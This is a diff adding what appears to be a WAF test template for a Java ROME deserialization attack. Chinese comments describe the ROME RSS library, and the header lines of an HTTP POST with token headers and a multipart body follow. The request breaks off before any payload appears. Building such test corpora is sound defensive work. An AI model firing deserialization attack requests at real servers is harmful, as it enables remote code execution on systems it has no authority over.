@@ -1,0 +1,12 @@
+# 反序列化-JAVA ROME
+# ROME 是用于 RSS 和 Atom 订阅的 Java 框架。 并根据 Apache 2.0 许可证开源。
+# 
+# ROME 包括一组用于各种形式的联合供稿的解析器和生成器，以及用于从一种格式转换为另一种格式的转换器。 解析器可以为您提供特定于您要使用的格式的 Java 对象，或者为您提供通用的规范化 SyndFeed 类，该类使您可以处理数据而不必担心传入或传出的提要类型。
+POST /?acid=80001751&bid=hd_tag_m8mv25nl HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25nl
+RM-PRO-Token: 6037d6dde12f3abca358da754ff46278
+RM-PRO-Time: 1742808485427
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=EJ3xsDKaRCQY-iZCdyScmMoMRaYAiVux
+
